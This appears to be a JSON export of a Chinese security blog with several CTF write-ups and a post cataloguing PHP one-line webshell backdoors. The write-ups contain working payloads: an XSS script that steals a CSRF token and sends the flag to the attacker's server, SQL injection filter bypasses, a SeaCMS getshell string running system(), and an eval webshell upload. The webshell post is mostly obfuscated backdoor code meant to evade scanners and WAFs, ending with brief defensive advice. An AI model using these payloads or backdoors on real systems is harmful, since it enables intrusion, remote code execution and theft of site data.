[{"title":"一次有趣的XSS弹弹乐","date":"2019-04-08T13:20:32.000Z","path":"2019/04/08/一次有趣的XSS弹弹乐/","text":"这是标题(๑¯∀¯๑)主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf &lt;SCRIPT>alert(1)&lt;SCRIPT> 但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf 访问接口需要进行referer验证 flag是通过getflag接口获取的，需要参数是csrftoken获取ﬂag的权限是通过 jsonp 中的 username验证的 ，这个 username 是后端解密 cookie 中的username 得到的明文。cookie 中的 username 受 http-only 保护不可读取，也没有能显示出 cookie 中加密的 username 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了 这时候的攻击思路就比较明确了：site填入http://xxxx/action.php?callback=\\&lt;js代码&gt;让admin访问这个url触发XSS获取自己的csrftoken值，然后带着这个值访问getflag接口，最后再将flag内容发送到我们的服务器。但是又遇到一个问题：site可填入的url长度太短了，根本不可能填入这样一个附带JS脚本的url，那只能另辟蹊径了 另一条攻击链： 链接 –&gt; 302跳转到 jsonp xss –&gt; 提取 jsonp 中 csrftoken –&gt; xhr 控制读取 flag –&gt; 返回flag到服务器 site:http://my_ip/xss.phpxss.php:123&lt;?phpheader('Location: http://target_ip/action.php?callback=&lt;script+src=\"http://my_ip/xss.js\"&gt;&lt;/script&gt;');?&gt; HTTP_REFERER 是由 html 文档对象 document 提供的,Location 是 http 协议的头部内容,浏览器一旦收到，就执行了,此时 document 尚未创建,所以此时的referer还是http://target_ip/loged.php xss.js:123456789window.onload = function cryscat()&#123; var obj = eval('('+document.body.innerText+')'); var ct = obj.csrftoken; var xml = new XMLHttpRequest(); xml.open('Get','http://target_ip/getflag.php?csrftoken='+ct,false); xml.send(); var res = xml.responseText; window.open('http://my_ip/?msg='+res);&#125; 最后返回的data: {‘flag’:’flag{j50nP_1s_VulN3r4bLe}’,’csrftoken’:’058807fed91d1b8807688bd258710cbe’} IP: 111.198.29.45 Referer: http://111.198.29.45:30987/action.php? callback=%3Cscript+src=%22http://my_ip/xss.js%22%3E%3C%2Fscript%3E Thank you for reading.(・ω&lt;)","tags":[{"name":"XSS","slug":"XSS","permalink":"http://www.cryscat.com/tags/XSS/"},{"name":"Trick","slug":"Trick","permalink":"http://www.cryscat.com/tags/Trick/"},{"name":"Note","slug":"Note","permalink":"http://www.cryscat.com/tags/Note/"},{"name":"CTF","slug":"CTF","permalink":"http://www.cryscat.com/tags/CTF/"}]},{"title":"嘉韦斯杯Writeup","date":"2019-04-01T15:38:32.000Z","path":"2019/04/01/嘉韦斯杯Writeup/","text":"壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本：123456789101112import requestsimport reurl = 'http://47.103.43.235:82/web/a/index.php'r = requests.session()res = r.get(url).textcont = re.findall('-?[0-9xABCDEF]\\d*[\\+\\-\\*\\%\\^/( )]*',res)cont = \"\".join(cont)resu = eval(cont[1:59])data = &#123;'result':resu&#125;ans = r.post(url,data = data)print(ans.text) 赛后专门琢磨了html内容提取，本体还可以用str.split(&quot;&lt;p&gt;&quot;)和str.split(&quot;&lt;/p&gt;&quot;)进行截取，截取方式不唯一，自己喜欢的才是最好的┓( ´-` )┏ 肆打开链接是一张二维码图片，保存到本地，用binwalk分离出其中的压缩包压缩包中有一个key.txt文件，flag应该就在里面了，解压发现需要密码，首先尝试伪加密破解，无果，应该是实打实的加密了，开始爆破密码，爆出密码：674290437，查看key.txt获得flag 伍神奇的密码1 又是一长串的字符，看出是base64，进行解密，又是一层base64，其中解出的base64编码的=都是%3D表示的。要将这部分url编码换成=再进行解码。最后解出得到fB__l621a4h4g_ai%7B%26i%7D将其中的url编码解码得到fB__l621a4h4g_ai{&amp;i}可以看到这像是一段打乱顺序的flag，试试栅栏密码、凯撒密码和列移位密码最终在栅栏密码5字一组的时候试出flag{B64_&amp;_2hai_14i} 陆神奇的密码2 题目给了一串字符：bg[`sZ*Zg’dPfP`VM_SXVd密码学的题，没多大头绪，规律是学长找出来的脚本：12345678str='bg[`sZ*Zg\\'dPfP`VM_SXVd'strlen=len(str)i=3flag=''for c in str: i=i+1 flag=flag+chr(ord(c)+i)print(flag) 柒又是一道SQL注入题，这题鼓捣了好久！ 经过测试发现id=后面是以base64加密逆序输入的，过滤了or、=、”、&#39;、union、select，并且不需要闭合引号 爆库：0/**/uunionnion/**/selselectect/**/1,2,3,4,5,database()#=MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆表：0/**/uunionnion/**/selselectect/**/1,2,3,4,5,table_name/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database()#=owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆列：0/**/uunionnion/**/selselectect/**/1,2,3,4,5,column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666C6167 #=MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 最后payload：0/**/uniunionon/**/seselectlect/**/1,2,3,4,5,flag/**/from/**/flag#jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM 捌上Kali的openssl，其中e就是exponent的值，转成十进制： 将解出的这串数字进行因式分解http://factordb.com 最后用python脚本进行解密：1234567891011#coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333q = 280385007186315115828483000867559983517n = 76775333340223961139427050707840417811156978085146970312315886671546666259161e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(\"fllllllag.txt\" , \"rb\") as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 玖seacms 这道题是直接利用海洋CMS 6.45版本前台getshell漏洞的payload打下来的Payload： searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(‘cat ../../flag.txt’); 拾查看源代码获得提示index.phps，得到主页源代码1234567891011&lt;?phperror_reporting(0);$flag = '********';if (isset($_POST['name']) and isset($_POST['password']))&#123; if ($_POST['name'] == $_POST['password']) print 'name and password must be diffirent'; else if (sha1($_POST['name']) === sha1($_POST['password'])) die($flag); else print 'invalid password';&#125;?&gt; 题目的关键点是name和password传入的内容要不同并且name和password的sha1值类型和内容都相同。那么就是主要考虑sha1对比的绕过。sha1函数要求传入的参数是字符串类型，那传入两个比如数组类型，结果就都是false,这样就会输出flag了 拾壹查看网页源代码 这道题上来首先就将我们传入的param1和param2类型转化为string，所以是不能通过数组绕过了。直接在网上搜了这样的两个值post上去： 后记这次比赛一共15道题，有四道没做出来，两道脑洞题，两道逆向（逆向真不是谁都能玩的啊！）。其中有一道希尔密码的题花的时间最多（关于希尔密码的加密解密有兴趣的同学可以自行百度，这里不再赘述），脚本是历经千辛万苦找到了，但最后flag还是不对……于是我去问了主办方，主办方说是这题有脑洞！！！行吧！希尔密码解密脚本：1234567891011121314151617181920212223242526272829303132333435Ma=[ 1,4,7, 2,5,8, 3,6,10 ]code=[ 23,10,12, 24,16,2, 25,3,9, 0,9,5 ]answer=[]flag = 0for t in range(0,12,3): flag = 0 for i in range(0,99,1): for j in range(0,99,1): for k in range(0,99,1): if ((1*i + 4*j + 7*k)%26 == code[t] and (2*i + 5*j + 8*k)%26 == code[t+1] and (3*i + 6*j + 10*k)%26 == code[t+2]): answer.append(i) answer.append(j) answer.append(k) flag = 1 break if(flag): break if(flag): break if(flag): continueprint (answer)for i in answer: print (chr(i + 97),end=\"\") 其中Ma是加密矩阵的逆矩阵，code是密文各字母对应的数字编码 比赛陆陆续续开始多起来了，好好加油吧！菜就是原罪！","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"嘉韦斯","slug":"嘉韦斯","permalink":"http://www.cryscat.com/tags/嘉韦斯/"},{"name":"华东师范大学","slug":"华东师范大学","permalink":"http://www.cryscat.com/tags/华东师范大学/"}]},{"title":"西北大学moeCTF-Web","date":"2019-03-10T12:10:14.000Z","path":"2019/03/10/西北大学moeCTF-Web/","text":"前言好久之前找到的一个CTF平台，今天偶然翻了出来，web部分还剩几道题，顺便刷掉吧…… 机器人很明显是robots协议 http://47.93.187.174/nwuctf/robots.txt 直接访问此文件得到flag nwuctf{robots_is_NOT_RobotQAQ} 让我们来弹一个flag根据题目意思，那就弹一个flag吧，在输入框输入&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;得到flag php弱类型查看源代码 12345678910&lt;/?php$s = $_GET['s'];$a = 'QNKCDZO';$md5a = md5($a);$md5s = md5($s);if($s != $a &amp;&amp; $md5a == $md5s)&#123; echo $flag;&#125;else&#123; echo 'try again';&#125; GET方式给s赋一个值，使s不等于a且s的md5值等于a的md5值,md5 collision payload: ?s=s878926199a An easy SQLi 2万能密码username:&#39;or 1=1，密码随便输，登进去getflag 头啊头哇首先赋值get=flag，然后会提示“必须使用IceRabbit浏览器”，改代理为IceRabbit Browser,接着会提示“你从google来吗？”，改Referrer为www.google.comgetflag 唯快不破?打开链接可以看到网页进行了多次跳转，利用python抓取页面就行了，将三个页面信息拼接得到flag php反序列化主页给了源码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);class hack&#123; public $mod1; public function __destruct() &#123; $this-&gt;mod1 = \"concat string\".$this-&gt;mod1; &#125;&#125;class str&#123; public $str1; public function __toString() &#123; $this-&gt;str1-&gt;flag(); return \"1\"; &#125;&#125;class get_flag&#123; public function flag() &#123; echo \"tql, 缁欏笀鍌呴€抐lag:\".\"nwuctf&#123;xxxxxxxxxxxxxxx&#125;\"; &#125;&#125;$a = $_GET['string'];unserialize($a);highlight_file(__FILE__);?&gt; 反推，flag可以通过str类的 __ toString方法输出。该方法会在类被当做字符串的时候自动调用，所以自然而然想到利用hack类中的__destruct payload代码 12345678910111213141516171819202122232425262728293031&lt;?phpclass hack&#123; public $mod1; public function __construct() &#123; $this-&gt;mod1 = new str; &#125;&#125;class str&#123; public $str1; public function __construct() &#123; $this-&gt;str1 = new get_flag; &#125;&#125;class get_flag&#123; public function flag() &#123; echo \"tql, 缁欏笀鍌呴€抐lag:\".\"nwuctf&#123;xxxxxxxxxxxxxxx&#125;\"; &#125;&#125;$a = new hack;$b = serialize($a);echo $b;?&gt; payload: string=O:4:%22hack%22:1:{s:4:%22mod1%22;O:3:%22str%22:1:{s:4:%22str1%22;O:8:%22get_flag%22:0:{}}} 如果还有如果题目给了源码 12345678910111213141516171819202122232425262728293031 &lt;?php$flag=\"nwuctf&#123;xxxxxxxxxxxxxxxxxxxx&#125;\";if (!empty($_SERVER['QUERY_STRING'])) &#123; $query = $_SERVER['QUERY_STRING']; $res = parse_str($query); if (!empty($res['action']))&#123; $action = $res['action']; &#125;&#125;if ($action === 'auth') &#123; if (!empty($res['user'])) &#123; $user = $res['user']; &#125; if (!empty($res['pass'])) &#123; $pass = $res['pass']; &#125; if (!empty($user) &amp;&amp; !empty($pass)) &#123; $hashed_password = hash('md5', $user.$pass); &#125; if (!empty($hashed_password) &amp;&amp; $hashed_password === '22180f07c8d8de04667257a18d9a64c6') &#123; echo $flag; &#125; else &#123; echo 'fail :('; &#125;&#125;else &#123; highlight_file(__FILE__);&#125; 利用parse_str函数覆盖变量hashed_password的值 payload: action=auth&amp;hashed_password=22180f07c8d8de04667257a18d9a64c6 An easy SQLi还是挺简单的，直接上sqlmap跑吧 sql注入漏洞sqlmap不是万能的╥﹏╥，只能靠自己手动注入了，简单测试了一下拦截了以下关键词order | left | mid | substr | like | = | %23(#)|ascii那就用right|regexp|--+进行注入吧~利用BP抓包并爆破?部分，突然发现MySQL不区分大小写？？？WTF！一路走来爆到不明大小写的库名、表名、列名、字段，很崩溃！因为过滤掉了ascii，在网上也没找到什么有用的相关资料，于是干脆直接去找西北大学的出题人聊了聊。他说这大小写并不是自己想要考察的点，只是自己没办法无奈之下的一个非预期效果……好吧 Orz。然后他甩给我一个链接。只要加入关键词binary就行了。 爆库 id=1’ and right(database(),1) regexp binary ‘§?§’ –+ 爆表 id=1’ and right((select group_concat(table_name) from information_schema.tables where table_schema regexp “ctf”),1) regexp binary ‘§?§’ –+ 爆列 id=1’ and right((select group_concat(column_name) from information_schema.columns where table_name regexp “fla49”),1) regexp ‘§?§’ –+ 爆段的最后一步 id=1’ and right((select group_concat(flag) from fla49),29) regexp binary ‘§?§wuctf{Her3_is_SQLi_FlaggQWQ}’ –+ flag : nwuctf{Her3_is_SQLi_FlaggQWQ} 被SQL玩的团团转。。。卒","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"moeCTF","slug":"moeCTF","permalink":"http://www.cryscat.com/tags/moeCTF/"},{"name":"Web","slug":"Web","permalink":"http://www.cryscat.com/tags/Web/"}]},{"title":"赛博地球杯网安大赛web部分Writeup","date":"2019-03-03T09:44:35.000Z","path":"2019/03/03/赛博地球杯网安大赛web部分Writeup/","text":"0X00 前言菜却坚强…… 0X01 大量设备报表不见了脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入爆破id试试id=2333时爆出flag 0X02 工控管理系统新版本大致浏览一下有login.php，regist.php，findpwd.php这三个页面在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了 爆数据库名：cetc004 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” –dbs 爆表名：user sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 –tables 爆列名：answer,password,question,username sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user –columns 爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump 后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了 0X03 工控云管理系统设备维护中心被植入后门http://111.198.29.45:32548/index.php?page=index看到这url第一反应就是文件包含 http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 拿去base64解密关键部分代码： 123456789101112131415161718&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。payload: pat=/a/e&amp;rep=phpinfo()&amp;sub=a 之后可以通过system()等函数命令执行 pat=/a/e&amp;rep=system(“cat s3chahahaDir/flag/flag.php”)&amp;sub=a 查看源代码getflag 0X04 工控云管理系统项目管理页面解析漏洞题目给了源代码：123456789101112131415161718&lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\"); if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True; &#125;?&gt; 在这一段代码中我们需要绕过if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)使$_SESSION[&#39;admin&#39;] = True。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造id=1\\09来绕过这部分限制。 第二部分代码： 123456789101112131415&lt;?php if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; 这里的$filename = &quot;backup/&quot;.$file;目录为假目录需要绕过。 正则表达式if(preg_match(&#39;/.+\\.ph(p[3457]?|t|tml)$/i&#39;, $filename))对文件后缀进行过滤 真实的上传目录为uploaded我们可以通过$file加../绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过../cryscat.php/1.php/..绕过。 payload(post) con=&lt;?php @eval($_POST[‘cryscat’]);?&gt;&amp;file=../cryscat.php/1.php/.. 之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"XCTF","slug":"XCTF","permalink":"http://www.cryscat.com/tags/XCTF/"}]},{"title":"那些强悍的PHP一句话后门","date":"2019-01-02T14:58:44.000Z","path":"2019/01/02/那些强悍的PHP一句话后门/","text":"强悍的PHP一句话后门这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。 利用404页面隐藏PHP小马：1234567891011&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php@preg_replace(\"/[pageerror]/e\",$_POST['error'],\"saft\");header('HTTP/1.1 404 Not Found');?&gt; 404页面是网站常用的文件，一般建好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。 无特征隐藏PHP一句话：1234&lt;?phpsession_start();$_POST['code'] &amp;&amp; $_SESSION['theCode'] = trim($_POST['code']);$_SESSION['theCode']&amp;&amp;preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\\'theCode\\']))','a'); 将$_POST[&#39;code&#39;]的内容赋值给$_SESSION[&#39;theCode&#39;]，然后执行$_SESSION[&#39;theCode&#39;]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。 超级隐蔽的PHP后门：1&lt;?php $_GET[a]($_GET[b]);?&gt; 仅用GET函数就构成了木马利用方法： ?a=assert&amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; 执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。 层级请求，编码运行PHP后门：此方法用两个文件实现，文件11234567&lt;?php//1.phpheader('Content-type:text/html;charset=utf-8');parse_str($_SERVER['HTTP_REFERER'], $a);if(reset($a) == '10' &amp;&amp; count($a) == 9) &#123; eval(base64_decode(str_replace(\" \", \"+\", implode(array_slice($a, 6)))));&#125; 文件212345678910111213141516171819202122&lt;?php//2.phpheader('Content-type:text/html;charset=utf-8');//要执行的代码$code = &lt;&lt;&lt;CODEphpinfo();CODE;//进行base64编码$code = base64_encode($code);//构造referer字符串$referer = \"a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=\";//后门url$url = 'http://localhost/test1/1.php';$ch = curl_init();$options = array( CURLOPT_URL =&gt; $url, CURLOPT_HEADER =&gt; FALSE, CURLOPT_RETURNTRANSFER =&gt; TRUE, CURLOPT_REFERER =&gt; $referer);curl_setopt_array($ch, $options);echo curl_exec($ch); 通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。 PHP后门生成工具weevelyweevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。 weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。 那些强悍的PHP一句话后门三个变形的一句话PHP木马第一个1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 在菜刀里写http://site/1.php?2=assert密码是1 第二个1234567&lt;?php$_=\"\";$_[+\"\"]='';$_=\"$_\".\"\";$_=($_[+\"\"]|\"\u0006\").($_[+\"\"]|\"\").($_[+\"\"]^\"\u0015\");?&gt;&lt;?php $&#123;'_'.$_&#125;['_']($&#123;'_'.$_&#125;['__']);?&gt; 在菜刀里写http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;]) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 第三个1($b4dboy = $_POST['b4dboy']) &amp;&amp; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！ 最后列几个高级的PHP一句话木马后门：1234567891011121314151617181920212223242526272829303132333435363738394041421、$hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";$hh(\"/[discuz]/e\",$_POST['h'],\"Access\");//菜刀一句话2、$filename=$_GET['xbid'];include ($filename);//危险的include函数，直接编译任何文件为php格式运行3、$reg=\"c\".\"o\".\"p\".\"y\";$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);//重命名任何文件4、$gzid = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";$gzid(\"/[discuz]/e\",$_POST['h'],\"Access\");//菜刀一句话5、include ($uid);//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif插一句话6、典型一句话程序后门代码&lt;?php eval_r($_POST[sb])?&gt;程序代码&lt;?php @eval_r($_POST[sb])?&gt;//容错代码程序代码&lt;?php assert($_POST[sb]);?&gt;//使用lanker一句话客户端的专家模式执行相关的php语句程序代码&lt;?$_POST['sa']($_POST['sb']);?&gt;程序代码&lt;?$_POST['sa']($_POST['sb'],$_POST['sc'])?&gt;程序代码&lt;?php@preg_replace(\"/[email]/e\",$_POST['h'],\"error\");?&gt;//使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入程序代码&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;程序代码&lt;script language=\"php\"&gt;@eval_r($_POST[sb])&lt;/script&gt;//绕过&lt;?限制的一句话 综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结! 如何应对PHP一句话后门：我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了： 1.对PHP程序编写要有安全意识2.服务器日志文件要经常看，经常备份3.对每个站点进行严格的权限分配4.对动态文件及目录经常批量安全审查5.学会如何进行手工杀毒《即行为判断查杀》6.时刻关注，或渗入活跃的网络安全营地7.对服务器环境层级化处理，哪怕一个函数也可做规则 我们认为当管理的站点多了，数据量大时，我们应合理应用一些辅助工具，但不应完全依赖这些工具，技术是时刻在更新进步的，最为重要的是你应学会和理解，编写这些强悍后门的人所处思维，角色上的换位可为你带来更大的进步。 [+]原文","tags":[{"name":"php","slug":"php","permalink":"http://www.cryscat.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://www.cryscat.com/tags/webshell/"}]}]